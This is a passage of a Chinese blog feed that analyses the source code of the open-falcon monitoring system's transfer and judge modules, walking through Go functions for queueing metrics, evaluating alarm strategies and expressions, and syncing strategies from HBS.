class="line">sender.Push2JudgeSendQueue(items)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cfg.Tsdb.Enabled &#123;</span><br><span class="line">sender.Push2TsdbSendQueue(items)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reply.Message = <span class="string">"ok"</span></span><br><span class="line">reply.Total = <span class="built_in">len</span>(args)</span><br><span class="line">reply.Latency = (time.Now().UnixNano() - start.UnixNano()) / <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数push2GraphSendQueue函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将数据 打入 某个Graph的发送缓存队列, 具体是哪一个Graph 由一致性哈希 决定</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Push2GraphSendQueue</span><span class="params">(items []*cmodel.MetaData)</span></span> &#123;</span><br><span class="line">cfg := g.Config().Graph</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> items &#123;</span><br><span class="line">        <span class="comment">// 转换数据</span></span><br><span class="line">graphItem, err := convert2GraphItem(item)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"E:"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">pk := item.PK()</span><br><span class="line"></span><br><span class="line"><span class="comment">// statistics. 为了效率,放到了这里,因此只有graph是enbale时才能trace</span></span><br><span class="line">proc.RecvDataTrace.Trace(pk, item)</span><br><span class="line">proc.RecvDataFilter.Filter(pk, item.Value, item)</span><br><span class="line"><span class="comment">// 得到对应的一致性hash分片节点</span></span><br><span class="line">node, err := GraphNodeRing.GetNode(pk)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"E:"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cnode := cfg.ClusterList[node]</span><br><span class="line">errCnt := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _, addr := <span class="keyword">range</span> cnode.Addrs &#123;</span><br><span class="line">Q := GraphQueues[node+addr]</span><br><span class="line">             <span class="comment">// 获取队列并推送到缓存队列中去</span></span><br><span class="line"><span class="keyword">if</span> !Q.PushFront(graphItem) &#123;</span><br><span class="line">errCnt += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// statistics</span></span><br><span class="line"><span class="keyword">if</span> errCnt &gt; <span class="number">0</span> &#123;</span><br><span class="line">proc.SendToGraphDropCnt.Incr()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他两个函数基本类似，都是使用这种方式来将数据推送的内存队列中，然后使用send task 任务发送出去。队列不会堆积，因为发送的时候会出队，不过这样如果发送三次还是失败，这个数据就丢失了。。只能通过统计数据来定位了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-transfer-源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-transfer-源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon transfer 源码分析&quot;&gt;&lt;/a&gt;open-falcon
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon judge 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/judge%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/judge%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:45.892Z</published>
    <updated>2020-01-21T09:06:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-judge源码分析"><a href="#open-falcon-judge源码分析" class="headerlink" title="open-falcon judge源码分析"></a>open-falcon judge源码分析</h2><p>judge模块主要流程在modules/judge/main</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析配置文件</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"><span class="comment">// 初始化数据库连接池</span></span><br><span class="line">g.InitRedisConnPool()</span><br><span class="line">    <span class="comment">// 初始化HBS客户端</span></span><br><span class="line">g.InitHbsClient()</span><br><span class="line"><span class="comment">//初始化存储，初始化内存BigMap，存储采集历史数据</span></span><br><span class="line">store.InitHistoryBigMap()</span><br><span class="line"><span class="comment">//http服务启动</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line">    <span class="comment">// rpc服务启动</span></span><br><span class="line"><span class="keyword">go</span> rpc.Start()</span><br><span class="line"><span class="comment">//定时从HBS同步策略</span></span><br><span class="line"><span class="keyword">go</span> cron.SyncStrategies()</span><br><span class="line">    <span class="comment">//清理无效数据</span></span><br><span class="line"><span class="keyword">go</span> cron.CleanStale()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>http服务接口数据，注册route:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">configCommonRoutes()</span><br><span class="line">configInfoRoutes()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看下rpc接口，judge主要有Send函数来做：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Judge)</span> <span class="title">Send</span><span class="params">(items []*model.JudgeItem, resp *model.SimpleRpcResponse)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">remain := g.Config().Remain</span><br><span class="line"><span class="comment">// 把当前时间的计算放在最外层，是为了减少获取时间时的系统调用开销</span></span><br><span class="line">now := time.Now().Unix()</span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> items &#123;</span><br><span class="line">exists := g.FilterMap.Exists(item.Metric)</span><br><span class="line"><span class="keyword">if</span> !exists &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">pk := item.PrimaryKey()</span><br><span class="line">        <span class="comment">// 接收数据，将数据放到bigMap中去</span></span><br><span class="line">store.HistoryBigMap[pk[<span class="number">0</span>:<span class="number">2</span>]].PushFrontAndMaintain(pk, item, remain, now)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数推送</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *JudgeItemMap)</span> <span class="title">PushFrontAndMaintain</span><span class="params">(key <span class="keyword">string</span>, val *model.JudgeItem, maxCount <span class="keyword">int</span>, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 如果这个keys存在了则压入队列，如果不存在放入队列之后调用judge函数判断</span></span><br><span class="line"><span class="keyword">if</span> linkedList, exists := this.Get(key); exists &#123;</span><br><span class="line">needJudge := linkedList.PushFrontAndMaintain(val, maxCount)</span><br><span class="line"><span class="keyword">if</span> needJudge &#123;</span><br><span class="line">Judge(linkedList, val, now)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">NL := list.New()</span><br><span class="line">NL.PushFront(val)</span><br><span class="line">safeList := &amp;SafeLinkedList&#123;L: NL&#125;</span><br><span class="line">this.Set(key, safeList)</span><br><span class="line">Judge(safeList, val, now)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查Strategy和expression:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Judge</span><span class="params">(L *SafeLinkedList, firstItem *model.JudgeItem, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">CheckStrategy(L, firstItem, now)</span><br><span class="line">CheckExpression(L, firstItem, now)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckStrategy</span><span class="params">(L *SafeLinkedList, firstItem *model.JudgeItem, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">key := fmt.Sprintf(<span class="string">"%s/%s"</span>, firstItem.Endpoint, firstItem.Metric)</span><br><span class="line">strategyMap := g.StrategyMap.Get()</span><br><span class="line">strategies, exists := strategyMap[key]</span><br><span class="line"><span class="keyword">if</span> !exists &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> strategies &#123;</span><br><span class="line"><span class="comment">// 因为key仅仅是endpoint和metric，所以得到的strategies并不一定是与当前judgeItem相关的</span></span><br><span class="line"><span class="comment">// 比如lg-dinp-docker01.bj配置了两个proc.num的策略，一个name=docker，一个name=agent</span></span><br><span class="line"><span class="comment">// 所以此处要排除掉一部分</span></span><br><span class="line">related := <span class="literal">true</span></span><br><span class="line"><span class="keyword">for</span> tagKey, tagVal := <span class="keyword">range</span> s.Tags &#123;</span><br><span class="line"><span class="keyword">if</span> myVal, exists := firstItem.Tags[tagKey]; !exists || myVal != tagVal &#123;</span><br><span class="line">related = <span class="literal">false</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 查找到相关的指标，然后judge对应的策略</span></span><br><span class="line"><span class="keyword">if</span> !related &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">judgeItemWithStrategy(L, s, firstItem, now)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>judgeItemWithStrategy函数寻找相应的策略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">judgeItemWithStrategy</span><span class="params">(L *SafeLinkedList, strategy model.Strategy, firstItem *model.JudgeItem, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">fn, err := ParseFuncFromString(strategy.Func, strategy.Operator, strategy.RightValue)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[ERROR] parse func %s fail: %v. strategy id: %d"</span>, strategy.Func, err, strategy.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断是否需要触发，如果满足条件，则发送事件</span></span><br><span class="line">historyData, leftValue, isTriggered, isEnough := fn.Compute(L)</span><br><span class="line"><span class="keyword">if</span> !isEnough &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">event := &amp;model.Event&#123;</span><br><span class="line">Id:         fmt.Sprintf(<span class="string">"s_%d_%s"</span>, strategy.Id, firstItem.PrimaryKey()),</span><br><span class="line">Strategy:   &amp;strategy,</span><br><span class="line">Endpoint:   firstItem.Endpoint,</span><br><span class="line">LeftValue:  leftValue,</span><br><span class="line">EventTime:  firstItem.Timestamp,</span><br><span class="line">PushedTags: firstItem.Tags,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 发送事件</span></span><br><span class="line">sendEventIfNeed(historyData, isTriggered, now, event, strategy.MaxStep)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendEventIfNeed</span><span class="params">(historyData []*model.HistoryData, isTriggered <span class="keyword">bool</span>, now <span class="keyword">int64</span>, event *model.Event, maxStep <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">lastEvent, exists := g.LastEvents.Get(event.Id)</span><br><span class="line"><span class="keyword">if</span> isTriggered &#123;</span><br><span class="line">event.Status = <span class="string">"PROBLEM"</span></span><br><span class="line"><span class="keyword">if</span> !exists || lastEvent.Status[<span class="number">0</span>] == <span class="string">'O'</span> &#123;</span><br><span class="line"><span class="comment">// 本次触发了阈值，之前又没报过警，得产生一个报警Event</span></span><br><span class="line">event.CurrentStep = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 但是有些用户把最大报警次数配置成了0，相当于屏蔽了，要检查一下</span></span><br><span class="line"><span class="keyword">if</span> maxStep == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sendEvent(event)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑走到这里，说明之前Event是PROBLEM状态</span></span><br><span class="line"><span class="keyword">if</span> lastEvent.CurrentStep &gt;= maxStep &#123;</span><br><span class="line"><span class="comment">// 报警次数已经足够多，到达了最多报警次数了，不再报警</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> historyData[<span class="built_in">len</span>(historyData)<span class="number">-1</span>].Timestamp &lt;= lastEvent.EventTime &#123;</span><br><span class="line"><span class="comment">// 产生过报警的点，就不能再使用来判断了，否则容易出现一分钟报一次的情况</span></span><br><span class="line"><span class="comment">// 只需要拿最后一个historyData来做判断即可，因为它的时间最老</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> now-lastEvent.EventTime &lt; g.Config().Alarm.MinInterval &#123;</span><br><span class="line"><span class="comment">// 报警不能太频繁，两次报警之间至少要间隔MinInterval秒，否则就不能报警</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">event.CurrentStep = lastEvent.CurrentStep + <span class="number">1</span></span><br><span class="line">sendEvent(event) <span class="comment">//发送事件，函数将报警事件存储到redis队列中去。</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 如果LastEvent是Problem，报OK，否则啥都不做</span></span><br><span class="line"><span class="keyword">if</span> exists &amp;&amp; lastEvent.Status[<span class="number">0</span>] == <span class="string">'P'</span> &#123;</span><br><span class="line">event.Status = <span class="string">"OK"</span></span><br><span class="line">event.CurrentStep = <span class="number">1</span></span><br><span class="line">sendEvent(event)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查表达式是否满足要求：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckExpression</span><span class="params">(L *SafeLinkedList, firstItem *model.JudgeItem, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">keys := buildKeysFromMetricAndTags(firstItem)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(keys) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// expression可能会被多次重复处理，用此数据结构保证只被处理一次</span></span><br><span class="line">handledExpression := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line">expressionMap := g.ExpressionMap.Get()</span><br><span class="line"><span class="keyword">for</span> _, key := <span class="keyword">range</span> keys &#123;</span><br><span class="line">expressions, exists := expressionMap[key]</span><br><span class="line"><span class="keyword">if</span> !exists &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//过滤相关表达式</span></span><br><span class="line">related := filterRelatedExpressions(expressions, firstItem)</span><br><span class="line"><span class="keyword">for</span> _, exp := <span class="keyword">range</span> related &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := handledExpression[exp.Id]; ok &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">handledExpression[exp.Id] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">judgeItemWithExpression(L, exp, firstItem, now)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似的满足要求发送事件给redis：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">judgeItemWithExpression</span><span class="params">(L *SafeLinkedList, expression *model.Expression, firstItem *model.JudgeItem, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">fn, err := ParseFuncFromString(expression.Func, expression.Operator, expression.RightValue)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[ERROR] parse func %s fail: %v. expression id: %d"</span>, expression.Func, err, expression.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">historyData, leftValue, isTriggered, isEnough := fn.Compute(L)</span><br><span class="line"><span class="keyword">if</span> !isEnough &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">event := &amp;model.Event&#123;</span><br><span class="line">Id:         fmt.Sprintf(<span class="string">"e_%d_%s"</span>, expression.Id, firstItem.PrimaryKey()),</span><br><span class="line">Expression: expression,</span><br><span class="line">Endpoint:   firstItem.Endpoint,</span><br><span class="line">LeftValue:  leftValue,</span><br><span class="line">EventTime:  firstItem.Timestamp,</span><br><span class="line">PushedTags: firstItem.Tags,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sendEventIfNeed(historyData, isTriggered, now, event, expression.MaxStep)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中使用fn.Compute使用的是离群点检测函数，更多请参考3-sigma算法，<a href="https://en.wikipedia.org/wiki/68%E2%80%9395%E2%80%9399.7_rule" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/68%E2%80%9395%E2%80%9399.7_rule</a><br>stddev(#10) = 3 //取最新 <strong>10</strong> 个点的数据分别计算得到他们的标准差和均值，分别计为 σ 和 μ，其中当前值计为 X，那么当 X 落在区间 [μ-3σ, μ+3σ] 之外时则报警。</p><p>接下来SyncStrategies函数从HBS同步策略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SyncStrategies</span><span class="params">()</span></span> &#123;</span><br><span class="line">duration := time.Duration(g.Config().Hbs.Interval) * time.Second</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">syncStrategies()   <span class="comment">//同步策略</span></span><br><span class="line">syncExpression()   <span class="comment">//同步表达式</span></span><br><span class="line">syncFilter()       <span class="comment">//同步过滤器</span></span><br><span class="line">time.Sleep(duration)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncStrategies</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> strategiesResponse model.StrategiesResponse</span><br><span class="line">err := g.HbsClient.Call(<span class="string">"Hbs.GetStrategies"</span>, model.NullRpcRequest&#123;&#125;, &amp;strategiesResponse)  <span class="comment">//调用HBS rpc接口数据数据</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[ERROR] Hbs.GetStrategies:"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rebuildStrategyMap(&amp;strategiesResponse)  <span class="comment">//重建策略数据结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncExpression</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> expressionResponse model.ExpressionResponse</span><br><span class="line">err := g.HbsClient.Call(<span class="string">"Hbs.GetExpressions"</span>, model.NullRpcRequest&#123;&#125;, &amp;expressionResponse)   <span class="comment">//调用HBS接口返回数据</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[ERROR] Hbs.GetExpressions:"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rebuildExpressionMap(&amp;expressionResponse)  <span class="comment">// 重建表达式数据结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncFilter</span><span class="params">()</span></span> &#123;</span><br><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//M map[string][]model.Strategy</span></span><br><span class="line">strategyMap := g.StrategyMap.Get()</span><br><span class="line"><span class="keyword">for</span> _, strategies := <span class="keyword">range</span> strategyMap &#123;</span><br><span class="line"><span class="keyword">for</span> _, strategy := <span class="keyword">range</span> strategies &#123;</span><br><span class="line">m[strategy.Metric] = strategy.Metric</span><br><span class="line">&#125;</span><br><span 